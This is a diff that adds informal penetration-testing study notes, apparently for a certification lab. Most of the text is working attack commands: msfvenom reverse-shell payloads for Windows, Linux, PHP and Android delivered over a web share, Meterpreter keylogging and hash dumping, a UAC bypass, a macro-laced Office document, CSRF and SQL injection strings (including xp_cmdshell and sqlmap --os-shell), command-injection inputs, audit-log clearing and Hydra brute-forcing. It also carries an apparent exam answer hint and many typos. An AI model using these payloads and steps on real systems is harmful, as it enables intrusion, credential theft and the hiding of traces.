@@ -1,0 +1,667 @@
+
+footprinting
+
+ping domain -f -L 1500/1300/1473/1472
+tracert domain
+
+firebug
+httrack
+>www.domain.com
+>set options > set results
+>browser mirrored website
+path analyzer
+>http:\\www.domain.com
+>Timed Trace
+
+Metasploit
+>service postgresql start
+>msfconsole
+>db_status
+if db status none - no connection
+>msfdb init
+>service postgresql restart
+>nmap -Pn -sS -A -oX Test 10.10.10.0/24
+>db_import Test
+>hosts
+>db_nmap -sS -A 10.10.10.16(whats intersting)
+>services
+>use scanner/smb/smb_version
+>show options
+>set RHOSTS target_ip(10.10.10.16)
+>set THREADS 100
+>run
+>hosts
+>set RHOSTS 10.10.10.8-16
+>run
+>hosts
+
+
+Enumeration
+nmap -sU -p 161 target
+nmap -sU -p 161 --script=snmp-brute target
+use auxiliary/scanner/snmp/snmp_login
+set RHOST target
+exploit
+use auxiliary/scanner/snmp/snmp_enum
+set RHOST target
+exploit
+
+	ADEXPLORER
+
+enum4linux -u user -p pass -o target -> os grabbing
+enum4linux -u user -p pass -P target -> password policy
+enum4linux -u user -p pass -G target -> group of user
+enum4linux -u user -p pass -G target -> share policy
+
+
+nikto
+nikto -h http://www.domain.com -Tuning 1
+
+
+system hacking
+wmic useraccount get name,sid
+pwdump7.exe
+pwdump7.exe > c:\hash.txt 
+ophcrack.exe
+cracking dump hashes from pwdump7.exe
+
+winrtgen.exe (rainbow Tables Generator)
+hash -> ntlm
+Min len -> 4
+Maz len ->6
+Chain Len -> 2400
+Chain Count -> 40000000
+N* of table -> 1
+charset ->loweralpha
+
+rcrack_gui.exe (RainbowCrack)
+load victim hashes 
+and load created rainbow table from winrtgen.exe
+
+L0phtCrack
+
+
+
+msfvenom 
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.10.11 LPORT=444 -o desktop/evil.exe
+mkdir /var/www/html/share
+chmod -R  755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+copy evil.exe to share folder
+service apche2 start
+msfconsole
+set payload windows/meterpreter/reverse_tcp
+set LHOST=10.10.10.11
+set  LPORT 444
+run
+
+open windows
+type 
+10.10.10.11/share
+download this and execute it.
+sysinfo
+run vnc
+exit
+
+
+msfvenom 
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00"-f exe LHOST=10.10.10.11  -o desktop/evil.exe
+msfconsole
+set payload windows/meterpreter/reverse_tcp
+set LHOST=10.10.10.11
+exploit -j -z
+session -i 1
+getuid
+run post/windows/gather/smart_hashdump
+getsystems -t 1
+background
+
+use exploit/windows/local/bypassuac_foodhelper
+set SESSION 1
+set payload wundows/meterpreter/reverse_tcp
+set TARGET 0
+exploit
+getuid 
+getsystem (named pipe impersonation)
+getuid
+run run post/windows/gather/smart_hashdump
+exit
+exit -y
+
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00"-f exe LHOST=10.10.10.11  > desktop/backdoor.exe
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST=10.10.10.11
+exploit -j -z
+session -i 1
+sysinfo
+getuid
+pwd
+cat secret.txt
+timestomp secret.txt -v 
+cd C:\
+ls
+download bootmgr
+search -f pagefile.sys
+keyscan_start (keylogger)
+keyscan_dump
+idletime
+shutdown
+
+
+
+rdp
+spyagent
+powerspy
+
+copy calc.exe in other folder
+create text file which contains hello worlds string.
+then 
+c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
+then created symbloic link
+mklink backdoor.exe readme.txt:calc.exe,
+
+
+steganography
+whitespace steganography Tools
+create readme.txt and type hello world in it and save this.
+snow.exe
+open cmd and type -> for hiding
+snow -C -m "Account pin 123" -p "magic" readme.txt readme2.txt
+show it
+snow -C -p "magic" readme2.txt
+
+openstego
+
+Image steganography
+quickstego
+
+
+wiping trace
+aditpol
+auditpol /get /category:*
+auditpol /set /category:"system","account logon" /success:enable /failure:enable
+clear audit policies
+auditpol /clear /y
+for cross check
+auditpol /get /category:*
+
+
+linux - covertly send message over destination
+echo "mysecret" > msg.txt
+>>other location >>connect to server >>smb://10.10.10.16/
+covert_tcp.c
+compile this
+cc -o covert_tcp covert_tcp.c
+sudo su 
+./covert_tcp -dest 10.10.10.9 -source 10.10.10.11 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/receive/receive.txt
+open wireshark on other machine
+./covert_tcp -dest 10.10.10.9 -source 10.10.10.11 -source_port 8888 -dest_port 9999 -file -file /root/Desktop/send/msg.txt
+
+Malicious Office Document - TheFatRat
+fatrat
+6 (create FUD backdoor with pwnwinds)
+3 (selected - apache+powershell FUD 100%)
+set lhost : 10.10.10.11
+set Lport:4444
+name: exploit
+paylod: 3 (windows/meterpreter/reverse_tcp)
+back to main menu
+
+7 (create FUD backdoor for office with microsploit)
+2 (selected - microsoft office macro on windows)
+set lhost : 10.10.10.11
+set Lport:4444
+name: evilDoc
+custom exe file backdoor: y
+path to backdoor: /exploit.exe
+payload: 3 (windows/meterpreter/reverse_tcp)
+
+share locallly as
+mkdir /var/www/html/share
+chmod -R  755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+copy BadDOC.docm to share folder
+
+service apache2 start
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST=10.10.10.11
+set LPORT 4444
+run
+session -i 1
+
+sysinfo
+exit
+
+
+Active Online Attack using reponder
+
+responder -I eth0 
+usr\share\responder\logs
+john usr\share\responder\capture_gfile.txt
+
+
+Social Engineering
+SET 
+
+Session Hijacking
+owasp zap
+
+Webser Hacking
+recon
+->skipfish
+skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.10.12:8080
+
+footprinting
+->httprecon
+->ID serve
+
+cracking FTP creds
+nmap -p 21 10.10.10.10
+
+ftp 10.10.10.10
+hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Password.txt ftp://10.10.10.10 
+
+fingerprinting
+uniscan
+uniscan -u http://10.10.10.12:8080/CEH -q
+
+uniscan -u http://10.10.10.12:8080/CEH -we 
+
+Computer/usr/share/uniscan/report
+
+
+
+xss or css
+parameter tempering
+xsss
+ibrar
+<script>alert("You Are Hacked)</script>
+
+wpscan --url http://10.10.10.12:8080/CEG --enumerate u
+msfconsole
+use axiliary/scanner/http/wordpress_login_enum
+PASS_FILE /root/Desktop/wordlists/Passwords.txt
+set RHOSTs 10.10.10.12
+set RPORT 8080
+set TARGETURI http://10.10.10.12:8080/CEH/
+set USERNAME admin
+run 
+
+
+dvwa
+command injection
+
+vega
+
+accnetix
+
+file upload vuln.
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=444 -f raw
+dvwa
+file upload
+msfconsole
+use multi/handler
+set payload php/meterpreter/recverse_tcp
+set lhost 10.10.10.11
+set lport 4444
+exploit
+sysinfo
+
+security medium DVWA
+file upload
+start burpsuite
+change extention of paylaod to 
+payload.php.jpeg
+capture the traffic after uploading the file then 
+change extention of paylaod to 
+payload.php.jpeg to payload.php and forward
+msfconsole
+use multi/handler
+set payload php/meterpreter/recverse_tcp
+set lhost 10.10.10.11
+set lport 4444
+exploit
+refresh 10.10.10.12:8080/dvwa/hackable/uploads/payload.php
+booom
+sysinfo
+
+
+security HIGH DVWA
+file upload
+start burpsuite
+open payload file and type GIF98 at start 
+change extention of paylaod to 
+payload.php.jpeg
+command injection
+| copy path\payload.php.jpeg path\copy.php
+msfconsole
+use multi/handler
+set payload php/meterpreter/recverse_tcp
+set lhost 10.10.10.11
+set lport 4444
+exploit
+refresh 10.10.10.12:8080/dvwa/hackable/uploads/copy.php
+booom
+sysinfo
+
+
+CSRF
+
+wpscan -u http://10.10.10.12:8080/CEH --enumerta vp
+CSRF performed using 2 firewall
+
+script:-
+<form method="POST" action="https://10.10.10.12:8080/CEH/wp-admin/options-general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php">
+<script>("As a admin, to enable additional security to your website. click submit ") </script>
+<input type="hidden" name="whitelisted_ip[]" value="10.10.10.11">
+<input type="hidden" name="set_whitelist_ip" value="Set Whitelisted IPs" class="button-secondary" >
+<input type="submit">
+</form>
+
+saved as Security_Script.html file
+share via SMB 
+other location > connect to server >smb://10.10.10.16
+
+
+SQL Injection
+web application flaw
+MS SQL
+
+login form - enter 
+username -> blah' or 1=1 --
+password -> 
+
+login form - enter
+username -> blah';insert into login values ('john','apple123'); --
+password -> 
+
+login form - enter 
+username -> blah';create database mydatabase; --
+password -> 
+
+DOS attack using SQL injection
+login form - enter 
+username -> blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
+password -> 
+
+Scanning Web Applications Using N-Stalker Tool
+policy > OWASP policy
+url > http://www.goodshopping.com
+
+
+SQLMAP - databases and webshells
+login to website and click on profile 
+note the URL "http://www.moviescope.com/viewprofile.aspx?id=1"
+and right click on anywhere on the page 
+click inspect and select console and type document.cookie
+copy the output value
+
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=" copy output value from document.cookie command" --dbs 
+after retriving databases, now retrieve tables
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=" copy output value from document.cookie command" -D databaseName --tables
+after retrieved the tables, now retrieve columns
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=" copy output value from document.cookie command" -D databaseName -T tableName --columns
+for table content
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=" copy output value from document.cookie command" -D databaseName -T tableName --dumb 
+gaining shhell
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=" copy output value from document.cookie command" --os-shell
+
+
+HashCalc - one way digest - hashing
+MD5 Calculator
+
+CryptoForge - encryption
+BCTextEncoder - Encryption
+
+Self Signed Certificate 
+
+veracrypt - disk encryption - on the fly encryption (OTFE)
+
+cryptool - data encryption
+Encrypt/Decrypt ->Symmetric(modern) ->RC2
+enter key lenght(8 bits) and eneter key using hexadecimal character (05)
+click encrypt
+
+
+cloud computing
+own cloud
+secure ownCloud using ClamAV
+msfvenom -p windows/meterpreter/revers_tcp -f exe > /root/Desktop/trojan.exe
+bypass controls
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.11 LPORT=4444 --platform linux -f elf > /root/Desktop/exploit.elf
+msfconsole
+use multi/handler
+set payload linux/x86/shell/reverse_tcp
+set lhost 10.10.10.11
+set lport 4444
+exploit
+download file from cloud to cloud VM and chmod 755 exploit.elf
+run it ... ./exploit.elf
+
+dos attack on cloud using slowloris script
+wireshark
+chmod 777 slowloris.pl
+./slowloris.pl -dns 10.10.10.9 
+
+
+Android
+terminal emulator
+type
+super user
+assign IP to phone type
+ipd addr add 10.10.10.69/24 dev eth0
+
+move to linux
+service postgresql start
+msfvenom -l
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.11 R > /root/Desktop/exploit.apk
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+change ownership of folder to www-data
+chown -R www-data:www-data /var/www/html/share
+cp /root/Desktop/exploit.apk /var/www/html/share 
+service apache2 start
+
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 10.10.10.11
+set lport 4444
+exploit -j -z
+sessions -i 1
+sysinfo
+ipconfig
+
+
+
+---------------------------------------------------------------------------------------------------------------================================
+
+For 8. The key value will be 11.
+
+U need to perform the cryptanalysis and u have to use the cryptool. Open the cryptool on top, click on encryption / decryption and
+then click on asymmetric and select tripe des ecb and set 11 11 11 in all. 
+But first please open that file in the tool they ask us to perform the decryption decryption
+
+For this remote command injection attack u need to perform the things a
+
+| dir c:\ with this command u can see the pin.txt file. But to read the content from this try this command
+| dir c:\ "pin.txt" or this command ! Take pin.txt
+
+
+==================================================================================================================================
+
+WINDOWS - COMMAND INJECTION
+
+
+Easy - Command Injection 
+
+Execute 127.0.0.1 & & net user
+Execute 127.0.0.1 & & net user & & ver command
+Execute 127.0.0.1 & & net user & & getmac
+
+Medium - Command Injection 
+
+127.0.0.1&net user
+127.0.0.1&net user&sc query&systeminfo
+127.0.0.1&;&ipconfig
+
+High - Command Injection
+
+127.0.0.1|net user
+
+FILE UPLOAD - WINDOWS
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw
+
+type GIF98 before PHP code and save as shell.jpeg.
+
+Copy the uploaded path 
+
+Click on command injectio and type below command
+|copy C:\xampp\htdocs\DVWA\hackable\uploads\shell.jpeg
+ C:\xampp\htdocs\DVWA\hackable\uploads\aa.php
+
+Msfconsole 
+Use multi/handler
+Set payload php/meterpreter/reverse_tcp
+Set lhost
+Set lport
+Run
+
+
+LINUX - COMMAND INJECTION
+
+Easy - Command Injection 
+
+192.168.0.1; pwd
+192.168.0.1; cat /etc/passwd | tee /tmp/passwd
+
+Medium - Command Injection 
+
+192.168.0.1 | cat /etc/passwd
+192.168.0.1 ||  cat /etc/passwd
+
+High - Command Injection
+
+|pwd
+
+Without space after pipe
+
+
+FILE UPLOAD - LINUX
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw
+
+type GIF98 before PHP code and save as shell.jpeg.
+
+Copy the uploaded path 
+
+Click on command injectio and type below command
+|mv C:\xampp\htdocs\DVWA\hackable\uploads\shell.jpeg
+ C:\xampp\htdocs\DVWA\hackable\uploads\aa.php
+
+Msfconsole 
+Use multi/handler
+Set payload php/meterpreter/reverse_tcp
+Set lhost
+Set lport
+Run
+
+
+SQL INJECTION
+
+
+git clone https://github.com/stamparm/DSSS.git && cd DSSS/
+
+https://suip.biz/?act=sqlmap
+
+https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
+
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+
+WIRESHARK
+and - operator: and / &&
+or - operator: or / ||
+equals - operator: eq / ==
+not equal - operator: ne / !=
+
+greater than - operator: gt /  >
+less than - operator: lt / <
+ip.addr == ip
+
+http contains your_domain
+
+tcp.port == 3389
+
+not tcp.port == 3389
+
+http
+
+http.request.method == get
+
+unencrypted protocols 
+http
+dns 
+ftp
+dns 
+
+dns protocol is running on udp port 53 and sometimes on tcp port 53.
+
+udp.port == 53 or dns only.
+
+
+
+
+
+
+
+
+
+
+
+
+JOHN
+
+Show Password After Cracking
+
+Indicator : 
+
+    1g 0:00:00:00 DONE (2021-11-03 18:59) 1.666g/s 8731Kp/s 8731Kc/s
+ 8731KC/s  N6546442..n626891 Use the "--show --format=NT" options to display all of the  cracked passwords reliably Session completed
+
+
+
+└─$ cat /home/kali/.john/john.pot
+
+└─$ john --show --format=haval-256-3 target_hash_file   
+    
+
+    Hashcat
+    
+    Show Password After Cracking
+
+    └─$ hashcat -m 1800 level7  /home/kali/Desktop/rockyou.txt --show                           
+
+    OR 
+
+    Displayed on the console
+
+HYDRA -BRUTE-FORCE
+
+CRACK http login form password
+
+└─$ hydra -l molly -P /home/kali/Desktop/rockyou.txt 10.10.60.138 http-post-form "/login:username=molly&password=^PASS^:incorrect" -V
+
+Crack SSH
+
+└─$ hydra -l molly -P /home/kali/Desktop/rockyou.txt 10.10.60.138 -t 4 ssh                       1 ⚙
+
+hydra -t 5 -V -f -L userlist -P passwordlist ftp://192.168.34.16
+
+hydra -t 4 -V -f -l administrator -P rockyou.txt rdp://192.168.34.16
+
+hydra 192.168.100.155 -V -l admin -P passwordlist http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low"
